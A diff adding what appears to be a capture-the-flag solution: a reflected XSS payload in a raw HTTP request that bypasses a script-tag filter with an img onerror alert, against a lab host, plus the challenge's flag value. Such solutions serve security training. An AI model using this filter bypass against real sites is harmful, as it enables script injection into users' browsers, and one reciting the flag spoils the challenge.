@@ -1,0 +1,4 @@
+# Reflected XSS via name param. <script> is filtered but img onerror works. Returns CTF flag: flag{3ae95ac5-69f0-4a02-82be-8d3afbd697c8}
+
+GET /page?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E HTTP/1.1
+Host: 172.17.0.1:51753
